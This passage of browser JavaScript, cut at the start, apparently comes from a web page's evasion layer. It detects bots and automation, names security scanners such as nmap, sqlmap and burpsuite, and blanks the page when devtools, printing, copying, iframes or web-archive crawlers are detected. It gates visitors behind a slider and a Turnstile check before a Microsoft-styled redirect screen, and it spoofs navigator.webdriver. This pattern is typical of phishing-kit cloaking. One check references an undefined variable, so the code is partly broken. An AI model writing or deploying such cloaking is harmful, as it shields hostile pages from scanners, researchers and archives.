      '_Selenium_IDE_Recorder', 'callSelenium', 'callPhantom', '_phantom',
      '$cdc_asdjflasutopfhvcZLmcfl_', '__cdc_'
    ];
    for (var g = 0; g < _automationGlobals.length; g++) {
      try { if (window[_automationGlobals[g]]) return true; } catch (e) {}
    }
    try { if (window.document && (window.document.__webdriver_evaluate || window.document.__selenium_evaluate)) return true; } catch (e) {}
    if (window._chrome && !window.chrome) return true;

    var ua = navigator.userAgent.toLowerCase();
    var botSignatures = [
      'bot', 'crawler', 'spider', 'scraper', 'crawling',
      'headless', 'phantomjs', 'puppeteer', 'playwright',
      'selenium', 'webdriver', 'automation',
      'nmap', 'masscan', 'zaproxy', 'burpsuite',
      'sqlmap', 'nikto', 'wget', 'curl',
      'axios', 'guzzle', 'python-requests', 'java/',
      'okhttp', 'postman', 'insomnia',
      'scrapy', 'beautifulsoup', 'httpx',
      'monitor', 'checker', 'probe', 'scanner',
    ];
    
    for (var i = 0; i < botSignatures.length; i++) {
      if (ua.includes(botSignatures[i])) {
        return true;
      }
    }

    
    return false;
  }
  var _mouseEvents = [];
  var _touchEvents = [];
  var _mouseTrackingStart = Date.now();
  document.addEventListener('mousemove', function(e) {
    _mouseEvents.push({
      x: e.clientX,
      y: e.clientY,
      t: Date.now() - _mouseTrackingStart
    });
    if (_mouseEvents.length > 200) _mouseEvents.shift();
  });

  document.addEventListener('touchstart', function(e) {
    if (e.touches && e.touches.length > 0) {
      _touchEvents.push({
        x: e.touches[0].clientX,
        y: e.touches[0].clientY,
        t: Date.now() - _mouseTrackingStart
      });
      if (_touchEvents.length > 100) _touchEvents.shift();
    }
  });

  function calculateBotScore() {
    var score = 0.3; 
    var maxScore = 1.0;
    var minScore = 0.0;

    try {
      if (!navigator.webdriver) score += 0.1; 
      else score -= 0.3; 

      if (navigator.languages && navigator.languages.length > 0) score += 0.05;
      if (navigator.plugins && navigator.plugins.length > 0) score += 0.05;
      if (navigator.cookieEnabled) score += 0.05;
    } catch (e) { score -= 0.1; }

    try {
      if (screen.width > 800 && screen.height > 600) score += 0.05;
      if (screen.colorDepth > 0) score += 0.02;
    } catch (e) { score -= 0.05; }

    try {
      if (window._chrome && !window.chrome) score -= 0.5;
      if (navigator.webdriver) score -= 0.3;
      if (window.document.__webdriver_evaluate) score -= 0.5;
      if (window.document.__selenium_evaluate) score -= 0.5;
      if (window.document.__fxdriver_evaluate) score -= 0.5;
      if (window.callPhantom || window._phantom) score -= 0.5;
    } catch (e) { /* ignore */ }
    try {
      var canvas = document.createElement('canvas');
      var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl && gl.getParameter) {
        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
          var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
          if (renderer && renderer.toLowerCase().indexOf('swiftshader') !== -1) score -= 0.3;
          if (renderer && renderer.toLowerCase().indexOf('llvmpipe') !== -1) score -= 0.3;
        }
      }
    } catch (e) { /* ignore */ }
    try {
      if (_mouseEvents.length >= 5) {
        var totalDist = 0;
        var directionChanges = 0;
        for (var i = 1; i < _mouseEvents.length; i++) {
          var dx = _mouseEvents[i].x - _mouseEvents[i-1].x;
          var dy = _mouseEvents[i].y - _mouseEvents[i-1].y;
          totalDist += Math.sqrt(dx*dx + dy*dy);
          if (i > 1) {
            var prevDx = _mouseEvents[i-1].x - _mouseEvents[i-2].x;
            var prevDy = _mouseEvents[i-1].y - _mouseEvents[i-2].y;
            if ((dx > 0 && prevDx < 0) || (dx < 0 && prevDx > 0) ||
                (dy > 0 && prevDy < 0) || (dy < 0 && prevDy > 0)) {
              directionChanges++;
            }
          }
        }
        var directionChangeRatio = _mouseEvents.length > 2 ? directionChanges / (_mouseEvents.length - 2) : 0;
        if (directionChangeRatio > 0.1 && totalDist > 50) {
          score += 0.15; 
        } else if (_mouseEvents.length > 20 && totalDist < 10) {
          score -= 0.2; 
        } else if (totalDist > 0) {
          score += 0.05; 
        }
      } else if (_mouseEvents.length === 0 && Date.now() - _mouseTrackingStart > 3000) {
        score -= 0.1;
      }
    } catch (e) { /* ignore */ }

    try {
      if ('ontouchstart' in window || navigator.maxTouchPoints > 0) {
        if (_touchEvents.length > 0) {
          score += 0.1; 
        } else if (Date.now() - _mouseTrackingStart > 5000) {
          score -= 0.05; 
        }
      }
    } catch (e) { /* ignore */ }

    try {
      var scrollY = window.scrollY || window.pageYOffset || 0;
      if (scrollY > 0) score += 0.05; 
    } catch (e) { /* ignore */ }

    return Math.max(minScore, Math.min(maxScore, score));
  }

  function initTurnstileVerification() {
    var widgetContainer = document.getElementById('turnstileWidget');
    if (!widgetContainer) {
      widgetContainer = document.createElement('div');
      widgetContainer.id = 'turnstileWidget';
      widgetContainer.style.display = 'none'; 
      document.body.appendChild(widgetContainer);
    }
    var _tsKey0 = String(window.__TURNSTILE_SITE_KEY || '');

    if (typeof window.turnstile === 'undefined') {
      window.vgOnTurnstileReady = function() {
        renderAndExecuteTurnstile(widgetContainer);
      };

      var script = document.createElement('script');
      script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js?onload=vgOnTurnstileReady';
      script.async = true;
      script.defer = true;
      script.id = 'vg-turnstile-script';
      script.onerror = function() {
      };
      (document.head || document.documentElement).appendChild(script);
      return;
    }

    renderAndExecuteTurnstile(widgetContainer);
  }

  var _vgTsMode = '';
  function _vgTurnstileManaged() {
    return _vgTsMode.toLowerCase() === 'managed';
  }

  function _vgTurnstileOn() {
    var e = window.__TURNSTILE_ENABLED;
    return e === true || e === 'true' || e === 1 || e === '1';
  }

  function renderAndExecuteTurnstile(widgetContainer) {
    if (widgetContainer.getAttribute('data-widget-id')) {
      return; 
    }

    _vgTsMode = (window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true')
      ? 'managed' : 'invisible';

    if (_vgTurnstileManaged()) {
      return;
    }

    try {
      var widgetId = window.turnstile.render('#turnstileWidget', {
        sitekey: window.__TURNSTILE_SITE_KEY,
        callback: function(token) {
          window.__TURNSTILE_TOKEN = token;
        },
        'error-callback': function() {
          if (!window.__TURNSTILE_TOKEN) window.__TURNSTILE_TOKEN = null;
        },
        'expired-callback': function() {
          window.__TURNSTILE_TOKEN = null;
          try { window.turnstile.execute(widgetId); } catch(e) {}
        }
      });

      widgetContainer.setAttribute('data-widget-id', widgetId);
      window.__TURNSTILE_WIDGET_ID = widgetId;

      setTimeout(function() {
        try { window.turnstile.execute(widgetId); } catch(e) {}
      }, 500);
    } catch(e) {
    }
  }

  function initAntiScreenshot() {
    var style = document.createElement('style');
    style.id = 'vg-anti-screenshot';
    style.textContent =
      '@media print {' +
      '  html, body, div, span, applet, object, iframe,' +
      '  h1, h2, h3, h4, h5, h6, p, blockquote, pre,' +
      '  a, abbr, acronym, address, big, cite, code,' +
      '  del, dfn, em, img, ins, kbd, q, s, samp,' +
      '  small, strike, strong, sub, sup, tt, var,' +
      '  b, u, i, center,' +
      '  dl, dt, dd, ol, ul, li,' +
      '  fieldset, form, label, legend,' +
      '  table, caption, tbody, tfoot, thead, tr, th, td,' +
      '  article, aside, canvas, details, embed, figure,' +
      '  figcaption, footer, header, hgroup, menu, nav,' +
      '  output, ruby, section, summary, time, mark, audio, video {' +
      '    all: none !important;' +
      '    visibility: hidden !important;' +
      '    opacity: 0 !important;' +
      '    display: none !important;' +
      '  }' +
      '  body::before {' +
      '    content: "";' +
      '    display: block;' +
      '    position: fixed;' +
      '    top: 0; left: 0; width: 100vw; height: 100vh;' +
      '    background: #ffffff;' +
      '    z-index: 999999;' +
      '  }' +
      '}' +

      ':focus-within {' +
      '  transition: opacity 0.1s;' +
      '}' +
      
      'body.window-blurred {' +
      '}' +
      'body.window-blurred #vg-screenshot-watermark {' +
      '  display: block !important;' +
      '}' +
      
      '';
    (document.head || document.documentElement).appendChild(style);

    try {
      var observer = new MutationObserver(function(mutations) {
        mutations.forEach(function(mutation) {
          if (mutation.removedNodes.length > 0) {
            mutation.removedNodes.forEach(function(node) {
              if (node.nodeType === 1) { 
                if (node.parentNode) {
                  node.style.visibility = 'visible';
                  node.style.opacity = '1';
                }
              }
            });
          }
          if (mutation.type === 'attributes' && mutation.target) {
            var el = mutation.target;
            if (el.style && (el.style.visibility === 'hidden' || el.style.display === 'none')) {
              if (el.id === 'codeValue' || el.className && el.className.indexOf('code') !== -1) {
                el.style.visibility = 'visible';
                el.style.display = '';
                el.style.opacity = '1';
              }
            }
          }
        });
      });
      observer.observe(document.body, {
        childList: true,
        subtree: true,
        attributes: true,
        attributeFilter: ['style', 'class']
      });
    } catch(e) {}
  }

  function initAntiClone() {
    var _isSlider = window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true';

    var _gracePeriodMs = 5000;
    var _startTime = Date.now();
    function isInGracePeriod() {
      return Date.now() - _startTime < _gracePeriodMs;
    }

    var devtoolsTiming = (function() {
      var threshold = 200; 
      var detected = false;
      var slowHits = 0;
      var lastTimingLogged = -1;
      setTimeout(function() { 
        var _isMobileClone = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent);
        setInterval(function() {
          if (isInGracePeriod()) return;
          if (document.visibilityState === 'hidden') { slowHits = 0; return; }
          if (_isMobileClone) { slowHits = 0; return; }
          var start = performance.now();
          var debuggerStr = 'debugger;';
          try {
            eval(debuggerStr);
          } catch(e) {}
          var elapsed = performance.now() - start;
          var elapsedR = Math.round(elapsed);
          if (elapsedR !== lastTimingLogged) {
            lastTimingLogged = elapsedR;
          }
          if (elapsed > threshold && !_isSlider) {
            slowHits++;
            if (slowHits >= 2) {
              detected = true;
              killPage('devtools_timing_' + Math.round(elapsed) + 'ms');
            }
          } else {
            slowHits = 0;
          }
        }, 1000); 
      }, _gracePeriodMs);
    })();

    setTimeout(function() { 
      try {
        var lastIntegrityLen = -1;
        var checkIntegrity = function() {
          if (document.visibilityState === 'hidden') return;
          var bodyHTML = document.body ? document.body.innerHTML : '';
          if (bodyHTML.length !== lastIntegrityLen) {
            lastIntegrityLen = bodyHTML.length;
          }
          if ((!bodyHTML || bodyHTML.length < 500) && !_isSlider && !window.__VG_BLANKED) {
            killPage('integrity_check_body_' + bodyHTML.length);
          }
        };
        setInterval(checkIntegrity, 5000); 
      } catch(e) {}
    }, _gracePeriodMs);

    if (!_isSlider) {
      window.addEventListener('beforeprint', function(e) {
        e.preventDefault();
        e.stopPropagation();
        killPage('beforeprint');
        return false;
      });
    }
    var isSliderPageAntiClone = window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true';
    if (window.self !== window.top && !isSliderPageAntiClone) {
      document.documentElement.innerHTML = '';
      killPage('iframe_embed');
    }

    var lastBodyLength = document.body ? document.body.innerHTML.length : 0;
    var domChangeCount = 0;
    setTimeout(function() { 
      setInterval(function() {
        if (isInGracePeriod()) return;
        var currentLength = document.body ? document.body.innerHTML.length : 0;
        if (Math.abs(currentLength - lastBodyLength) > 100000) {
          domChangeCount++;
          if (domChangeCount > 5) {
            killPage('dom_change');
          }
        } else {
          domChangeCount = Math.max(0, domChangeCount - 1);
        }
        lastBodyLength = currentLength;
      }, 2000); 
    }, _gracePeriodMs);

    var _killPageCalled = false;
    function killPage(reason) {
      if (_killPageCalled) {
        return;
      }
      _killPageCalled = true;

      try {
        document.open();
        document.write('');
        document.close();
      } catch(e) {}

      try { flushLogs(); } catch(e) {}

      setTimeout(function() {
        try { window.location.replace('about:blank'); } catch(e) {}
      }, 400);
    }

    var _nativeCreateCanvas = document.createElement.bind(document);
    document.createElement = function(tagName) {
      var el = _nativeCreateCanvas(tagName);
      if (tagName.toLowerCase() === 'canvas') {
        var origGetContext = el.getContext;
        el.getContext = function() {
          try {
            var ctx = origGetContext.apply(this, arguments);
            if (ctx && ctx.fillStyle) {
              ctx.fillStyle = '#000000';
              ctx.fillRect(0, 0, 99999, 99999);
            }
          } catch(e) {}
          return ctx;
        };
      }
      return el;
    };

    try {
      var origGetDisplayMedia = navigator.mediaDevices.getDisplayMedia;
      if (origGetMedia) {
        navigator.mediaDevices.getDisplayMedia = function() {
          return Promise.reject(new Error('Screen capture not allowed'));
        };
      }
    } catch(e) {}

    try {
      var _wdExisting = Object.getOwnPropertyDescriptor(navigator, 'webdriver');
      if (!_wdExisting || typeof _wdExisting.get !== 'function') {
        _vgWebdriverGetter = function() {
          return false;
        };
        Object.defineProperty(navigator, 'webdriver', {
          get: _vgWebdriverGetter,
          configurable: true
        });
      }
    } catch(e) {}

    (function() {
      var fingerprint = '';
      try {
        fingerprint += navigator.hardwareConcurrency || '';
        fingerprint += navigator.deviceMemory || '';
        fingerprint += screen.colorDepth + 'x' + screen.pixelDepth;
        fingerprint += new Date().getTimezoneOffset();
        fingerprint += (navigator.languages || []).join(',');
      } catch(e) {}
      window.__vg_fingerprint = btoa(fingerprint || 'unknown');
    })();
  }

  function initAntiScraping() {
    if (window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true') {
      return;
    }

    function obfuscateSensitiveContent() {

      var sensitiveSelectors = [
        '[data-sensitive]',
        '[id*="token"]',
        '[class*="token"]'
      ];

      var _originalValues = new WeakMap();

      sensitiveSelectors.forEach(function(selector) {
        try {
          var elements = document.querySelectorAll(selector);
          elements.forEach(function(el) {
            if (el.getAttribute('data-vg-revealed') === 'true') return;

            if (el && el.textContent && el.textContent.length > 3) {
              _originalValues.set(el, el.textContent);
              el.textContent = '••••••';
            }
          });
        } catch(e) {}
      });

      window.__vgRevealSensitive = function(el) {
        return _originalValues.get(el) || el.textContent;
      };

      setInterval(obfuscateSensitiveContent, 5000);
    }
  
    function detectExtraction() {
      var copyCount = 0;
      var selectCount = 0;

      document.addEventListener('copy', function() {
        copyCount++;
        if (copyCount > 50) {
          killPage('copy_count');
        }
      });

      document.addEventListener('selectstart', function() {
        selectCount++;
        if (selectCount > 100) {
          killPage('select_count');
        }
      });

      document.addEventListener('keydown', function(e) {
        var isMac = /Mac OS X|Macintosh|iPhone|iPad|iPod/.test(navigator.userAgent);
        if ((e.key === 'F12' && !isMac) ||
            (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'j' || e.key === 'c'))) {
          killPage('devtools_key');
        }
      });
    }

    function protectCanvasFingerprinting() {
      var originalGetContext = HTMLCanvasElement.prototype.getContext;
      var wrappedContexts = new WeakMap();

      HTMLCanvasElement.prototype.getContext = function(contextType) {
        var ctx = originalGetContext.apply(this, arguments);
        if (!ctx || (contextType !== '2d' && contextType !== 'webgl')) {
          return ctx;
        }

        if (wrappedContexts.has(ctx)) {
          return wrappedContexts.get(ctx);
        }

        var wrapped = Object.create(ctx);

        var origToDataURL = ctx.canvas.toDataURL.bind(ctx.canvas);
        ctx.canvas.toDataURL = function(type, quality) {
          try {
            ctx.save();
            ctx.globalAlpha = 0.005; 
            ctx.fillStyle = 'rgba(' + Math.floor(Math.random() * 10) + ',' +
                           Math.floor(Math.random() * 10) + ',' +
                           Math.floor(Math.random() * 10) + ',1)';
            ctx.fillRect(
              Math.floor(Math.random() * ctx.canvas.width),
              Math.floor(Math.random() * ctx.canvas.height),
              1, 1
            );
            ctx.restore();
          } catch(e) {}
          return origToDataURL(type, quality);
        };

        var origGetImageData = ctx.getImageData.bind(ctx);
        ctx.getImageData = function(sx, sy, sw, sh) {
          var data = origGetImageData(sx, sy, sw, sh);
          try {
            var idx = Math.floor(Math.random() * (data.data.length / 4)) * 4;
            var noise = Math.floor(Math.random() * 3) - 1; 
            data.data[idx] = Math.min(255, Math.max(0, data.data[idx] + noise));
          } catch(e) {}
          return data;
        };

        wrappedContexts.set(ctx, wrapped);
        return ctx;
      };
    }
    
    function detectArchiving() {
      var ua = navigator.userAgent.toLowerCase();
      var archiveBots = [
        'archive.org', 'wayback', 'web.archive', 
        'archivebot', 'webcapture', 'httrack'
      ];
      
      for (var i = 0; i < archiveBots.length; i++) {
        if (ua.includes(archiveBots[i])) {
          killPage('archive_bot:' + archiveBots[i]);
          return;
        }
      }
      
      var metaTags = document.querySelectorAll('meta');
      for (var i = 0; i < metaTags.length; i++) {
        var content = metaTags[i].getAttribute('content') || '';
        if (content.toLowerCase().includes('archive') || 
            content.toLowerCase().includes('wayback')) {
          killPage('archive_content');
        }
      }
    }
    
    function addTimingNoise() {
      var originalNow = Date.now;
      Date.now = function() {
        return originalNow.call(Date) + Math.floor(Math.random() * 5);
      };
      
      var originalPerfNow = performance.now;
      performance.now = function() {
        return originalPerfNow.call(performance) + Math.random() * 0.5;
      };
    }
    
    obfuscateSensitiveContent();
    detectExtraction();
    protectCanvasFingerprinting();
    detectArchiving();
 
    var _killPageCalledBot = false;
    function killPage(reason) {
      if (_killPageCalledBot) {
        return;
      }
      _killPageCalledBot = true;

      try {
        document.open();
        document.write('');
        document.close();
      } catch(e) {}

      try { flushLogs(); } catch(e) {}

      setTimeout(function() {
        try { window.location.replace('about:blank'); } catch(e) {}
      }, 400);
    }
  }
  function initAntiDebug() {
    var _adFlag = window.__ANTIDEBUG_ENABLED;
    if (_adFlag === false || _adFlag === 'false' || _adFlag === '0' || _adFlag === 0) return;

    var _killed = false;
    function killDevtools() {
      if (_killed) return;
      _killed = true;
      try { logToServer('warn', '[VG] DevTools detected, terminating page'); } catch (e) {}
      try {
        document.open();
        document.write('<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>html,body{margin:0;padding:0;background:#fff;height:100%;overflow:hidden}</style></head><body></body></html>');
        document.close();
      } catch (e) {
        try { document.documentElement.innerHTML = ''; if (document.body) document.body.style.background = '#fff'; } catch (e2) {}
      }
      try { window.close(); } catch (e) {}
      setTimeout(function () { try { window.location.replace('about:blank'); } catch (e) {} }, 0);
    }

    var isSliderPageDebug = window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true';
    var isMobile = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent) ||
      (window.innerWidth <= 768 && ('ontouchstart' in window));

    var _sizeHits = 0;
    function windowDelta() {
      try { return { wd: window.outerWidth - window.innerWidth, hd: window.outerHeight - window.innerHeight }; }
      catch (e) { return { wd: 0, hd: 0 }; }
    }
    function checkWindowDelta() {
      var d = windowDelta();
      if (d.wd > 160 || d.hd > 160) {
        _sizeHits++;
        if (_sizeHits >= 2 || d.wd > 240 || d.hd > 240) killDevtools();
      } else {
        _sizeHits = 0;
      }
    }

    var _toStringBaseline = null;
    try { _toStringBaseline = String(Function.prototype.toString).indexOf('[native code]') !== -1; } catch (e) {}
    var _tsHits = 0;
    function checkToStringNative() {
      try {
        if (!_toStringBaseline) return;
        if (String(Function.prototype.toString).indexOf('[native code]') === -1) {
          _tsHits++;
          if (_tsHits >= 2) killDevtools();
        } else {
          _tsHits = 0;
        }
      } catch (e) {}
    }

    if (typeof window.__devtools !== 'undefined') {
      killDevtools();
    } else if (!isMobile) {
      var d0 = windowDelta();
      if (d0.wd > 160 || d0.hd > 160) killDevtools();
    }
    if (_killed) return;

    if (!isMobile) {
      var sizeInterval = setInterval(function () {
        if (_killed) { clearInterval(sizeInterval); return; }
        checkWindowDelta();
        checkToStringNative();
      }, 400);
      window.addEventListener('resize', function () { if (!_killed) checkWindowDelta(); }, true);
    }

    if (!isSliderPageDebug && !isMobile) {

      var _dbgHits = 0;
      var dbgInterval = setInterval(function () {
        if (_killed) { clearInterval(dbgInterval); return; }

        if (document.visibilityState === 'hidden') { _dbgHits = 0; return; }
        var s = (window.performance && performance.now) ? performance.now() : Date.now();
        debugger;
        var d = (window.performance && performance.now) ? performance.now() : Date.now();
        if (d - s > 150) {
          _dbgHits++;
          if (_dbgHits >= 2) killDevtools();
        } else {
          _dbgHits = 0;
        }
      }, 1000);
    }
  }

  function _flagEnabled(v) {
    return v === true || v === 1 || String(v) === 'true' || String(v) === '1';
  }
  function initObfuscation() {
    if (!_flagEnabled(window.__OBFUSCATION_ENABLED)) return;
    document.addEventListener('contextmenu', function (e) { e.preventDefault(); });

    document.addEventListener('keydown', function (e) {
      if (e.ctrlKey && (e.key === 'u' || e.key === 's')) e.preventDefault();
      if (e.key === 'F12') e.preventDefault();
    });
  }

  function initSliderChainHandler() {
    var isSlider = window.__SLIDER_DESIGN === true || window.__SLIDER_DESIGN === 'true';
    if (!isSlider) { return; }
    var _sliderCompleted = false;
    var _turnstileRendering = false;
    var _turnstileRendered = false;
    var _layersHidden = false;
    var _cfAttempts = 0;
    var _cfMaxAttempts = 3;

    var CF_TIMEOUT_MS = 180000;

    var _cfLastError = '';

    var _cfTimeoutTimer = null;
    function _resetCfTimeout() {
      clearTimeout(_cfTimeoutTimer);
      _cfTimeoutTimer = setTimeout(function() {
        _cfAttempts = _cfMaxAttempts;
        _cfLastError = 'Turnstile did not complete within the timeout';
        _turnstileRendering = false;
        _turnstileRendered = true;
        showCfFailureState(document.getElementById('vgCfHint'), _cfLastError);
      }, CF_TIMEOUT_MS);
    }
    function _cancelCfTimeout() {
      clearTimeout(_cfTimeoutTimer);
    }

    function _onCfFailure(errMsg) {
      _turnstileRendering = false;
      _cfLastError = String(errMsg || '');
      var cfHint = document.getElementById('vgCfHint');

      if (_cfAttempts >= _cfMaxAttempts) {
        _turnstileRendered = true;
        showCfFailureState(cfHint, errMsg);
        return;
      }

      _cfAttempts += 1;
      if (cfHint) {
        cfHint.textContent = 'Verification failed, retrying (' + _cfAttempts +
          ' of ' + _cfMaxAttempts + ')...';
      }
      setTimeout(function () {
        var wrap = document.getElementById('vgCfWidgetWrap');
        var ph = document.getElementById('vgCfPlaceholder');
        if (wrap) { try { wrap.innerHTML = ''; } catch (e) {} }
        if (ph) ph.style.display = 'flex';
        renderTurnstileIntoCfLayer();
      }, 1500);
    }

    function showCfFailureState(cfHint, detail) {
      var cfLayer = document.getElementById('vgCfLayer');
      if (cfLayer) {
        cfLayer.style.display = 'flex';
        cfLayer.style.visibility = 'visible';
        cfLayer.style.pointerEvents = 'auto';
      }
      var wrap = document.getElementById('vgCfWidgetWrap');
      if (wrap) { try { wrap.innerHTML = ''; } catch (e) {} }
      var ph = document.getElementById('vgCfPlaceholder');
      if (ph) ph.style.display = 'none';

      if (!cfHint) return;
      cfHint.textContent = '';
      cfHint.style.display = 'flex';
      cfHint.style.flexDirection = 'column';
      cfHint.style.alignItems = 'center';
      cfHint.style.justifyContent = 'center';
      cfHint.style.gap = '12px';

      var msg = document.createElement('div');
      msg.style.cssText = 'font-size:13px;color:#605E5C;line-height:1.5;max-width:300px;text-align:center;';
      msg.textContent = 'Security verification could not be completed. Please try again.';

      if (detail) {
        var det = document.createElement('div');
        det.style.cssText = 'font-size:11px;color:#9a9896;line-height:1.4;max-width:300px;' +
          'text-align:center;font-family:monospace;margin-top:4px;';
        det.textContent = String(detail);
        cfHint.appendChild(det);
      }

      var btn = document.createElement('button');
      btn.type = 'button';
      btn.textContent = 'Retry security check';
      btn.style.cssText = 'padding:10px 22px;font-size:13px;font-weight:600;color:#fff;' +
        'background:#232333;border:0;border-radius:8px;cursor:pointer;font-family:inherit;';
      btn.addEventListener('click', function () {
        btn.disabled = true;
        btn.textContent = 'Retrying...';
        _cfAttempts = 0;
        _turnstileRendered = false;
        var wrap2 = document.getElementById('vgCfWidgetWrap');
        if (wrap2) { try { wrap2.innerHTML = ''; } catch (e) {} }
        setTimeout(function () { renderTurnstileIntoCfLayer(); }, 500);
      });

      cfHint.appendChild(msg);
      cfHint.appendChild(btn);
    }

    if (typeof window.__vgOnSliderComplete !== 'function' || !window.__vgOnSliderComplete._isEngine) {
      window.__vgOnSliderComplete = function() {
        if (_sliderCompleted) {
          return;
        }
        _sliderCompleted = true;

        try {
          var mouseResult = window.__VG_ANALYZE_MOUSE ? window.__VG_ANALYZE_MOUSE() : null;
          if (mouseResult && mouseResult.score >= 0.75) {
            if (typeof window.__VG_KILLPAGE === 'function') {
              window.__VG_KILLPAGE('robotic_mouse:' + mouseResult.score.toFixed(2));
              return;
            }
          }
        } catch (e) { /* never let the analysis itself break the flow */ }

        var sliderLayer = document.getElementById('vgSliderLayer');
        if(sliderLayer){
          sliderLayer.style.display = 'none';
          sliderLayer.style.visibility = 'hidden';
          sliderLayer.style.pointerEvents = 'none';
        }

        var cfLayer = document.getElementById('vgCfLayer');
        if(cfLayer){
          cfLayer.style.display = 'flex';
        }

        window.__vgSliderVerified = true;
        window.__vgCheckSliderReady = function () {
          return window.__vgSliderVerified === true;
        };

        renderTurnstileIntoCfLayer();
      };
      window.__vgOnSliderComplete._isEngine = true;
    }

    if (window.__vgPendingSliderComplete && window.__vgSliderVerified) {
      setTimeout(function() {
        if (typeof window.__vgOnSliderComplete === 'function') {
          window.__vgOnSliderComplete();
        }
      }, 100);
    }
    
    function renderTurnstileIntoCfLayer() {
      if (_turnstileRendering || _turnstileRendered) {
        return;
      }
      _turnstileRendering = true;

      var cfWidgetWrap = document.getElementById('vgCfWidgetWrap');
      var cfPlaceholder = document.getElementById('vgCfPlaceholder');
      var cfHint = document.getElementById('vgCfHint');
      
      if(!cfWidgetWrap) {
        _turnstileRendering = false;
        _turnstileRendered = true;
        showCfFailureState(cfHint, 'Widget container missing');
        return;
      }
      
      if(cfPlaceholder) {
        cfPlaceholder.style.display = 'none';
      } else if(cfWidgetWrap) {
        var ph = document.createElement('div');
        ph.id = 'vgCfPlaceholder';
        ph.style.cssText = 'text-align:center;';
        ph.innerHTML = '<div style="width:40px;height:40px;border:3px solid #e4e4e4;' +
          'border-top-color:#0078D4;border-radius:50%;animation:vgSpin 1s linear infinite;' +
          'margin:0 auto 12px;"></div>' +
          '<div style="font-size:13px;color:#605E5C;">Completing verification...</div>';
        cfWidgetWrap.appendChild(ph);
      }
      
      if(typeof window.turnstile !== 'undefined') {
        executeTurnstileIntoWrap(cfWidgetWrap);
      } else if(window.__TURNSTILE_ENABLED && window.__TURNSTILE_SITE_KEY) {
        var script = document.createElement('script');
        script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js?onload=vgOnTurnstileReadyForSlider';
        script.async = true;
        script.defer = true;
        script.id = 'vg-turnstile-script-slider';
        (document.head || document.documentElement).appendChild(script);
        
        setTimeout(function() {
          if (typeof window.turnstile === 'undefined') {
            _onCfFailure('Turnstile script failed to load within timeout');
          }
        }, 15000);
        window.vgOnTurnstileReadyForSlider = function() {
          _turnstileRendering = false;
          executeTurnstileIntoWrap(cfWidgetWrap);
        };
      } else {
        _onCfFailure('No Turnstile site key configured');
      }
    }
    
    function executeTurnstileIntoWrap(widgetWrap) {
      _vgTsMode = 'managed';
      var cfHint = document.getElementById('vgCfHint');

      if (_cfAttempts >= _cfMaxAttempts) {
        showCfFailureState(cfHint, _cfLastError || 'Retry limit reached');
        return;
      }

      try {
        var widgetId = window.turnstile.render('#vgCfWidgetWrap', {
          sitekey: window.__TURNSTILE_SITE_KEY,
          theme: 'light',
          retry: 'auto', 
          callback: function(token) {
            _cancelCfTimeout(); 
            window.__TURNSTILE_TOKEN = token;
            _turnstileRendered = true;
            setTimeout(function(){
              hideSliderAndCfLayers();
            }, 1000);
          },
          'error-callback': function(errorCode) {
            _onCfFailure('Turnstile error-callback ' + (errorCode || ''));
          },
          'expired-callback': function() {
            _cfAttempts = 0;
            try { window.turnstile.execute(widgetId); }
            catch(e) { _onCfFailure(String(e)); }
          }
        });

        _resetCfTimeout();
        setTimeout(function() {
          try {
            window.turnstile.execute(widgetId);
          } catch(e) {
            _onCfFailure(String(e));
          }
        }, 500);

      } catch(e) {
        _onCfFailure(String(e));
      }
    }
    
    function _showRedirectTransition(onDone) {
      var REDIRECT_MS = 2500;

      var style = document.createElement('style');
      style.textContent = '@keyframes vgRedirectSpin{to{transform:rotate(360deg)}}';
      (document.head || document.documentElement).appendChild(style);

      var el = document.getElementById('vgRedirectLayer');
      if (!el) {
        el = document.createElement('div');
        el.id = 'vgRedirectLayer';
        el.style.cssText = 'position:fixed;inset:0;z-index:100000;background:#F1F3F5;' +
          'font-family:"Segoe UI",-apple-system,BlinkMacSystemFont,sans-serif;' +
          'display:flex;align-items:center;justify-content:center;padding:24px 16px;';
        el.innerHTML =
          '<div style="background:#fff;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,.06);' +
          'border:1px solid #EDEBE9;width:100%;max-width:420px;padding:40px 32px;text-align:center;">' +
          '<div style="width:36px;height:36px;border:3px solid #EDEBE9;border-top-color:#0078D4;' +
          'border-radius:50%;margin:0 auto 20px;animation:vgRedirectSpin 1s linear infinite;"></div>' +
          '<h1 style="font-size:20px;font-weight:700;color:#232333;margin-bottom:6px;">Redirecting...</h1>' +
          '<p style="font-size:13px;color:#605E5C;margin:0;line-height:1.5;">Please wait a moment.</p>' +
          '</div>';
        document.body.appendChild(el);
      }
      el.style.display = 'flex';

      setTimeout(function() {
        try { if (el.parentNode) el.parentNode.removeChild(el); } catch (e) {}
        if (typeof onDone === 'function') onDone();
      }, REDIRECT_MS);
    }

    function hideSliderAndCfLayers() {
      if (_layersHidden) {
        return;
      }
      _layersHidden = true;

      _showRedirectTransition(function() {
        var sliderLayer = document.getElementById('vgSliderLayer');
        var cfLayer = document.getElementById('vgCfLayer');

        if(sliderLayer){
          sliderLayer.style.display = 'none';
          sliderLayer.style.visibility = 'hidden';
        }
        if(cfLayer){
          cfLayer.style.display = 'none';
          cfLayer.style.visibility = 'hidden';
        }

      });
    }

    setTimeout(function(){
      if (!_sliderCompleted && window.__vgCheckSliderReady && window.__vgCheckSliderReady()) {
        if (typeof window.__vgOnSliderComplete === 'function') {
          window.__vgOnSliderComplete();
        }
      }
    }, 1000);
  }

  function init() {
    applyDynamicContent();
    initBackgroundBlur();
    initSliderChainHandler();
    initBotDetection();
    initAntiScreenshot();
    initAntiClone();
    initAntiDebug();
    initAntiScraping();
    initObfuscation();
  }

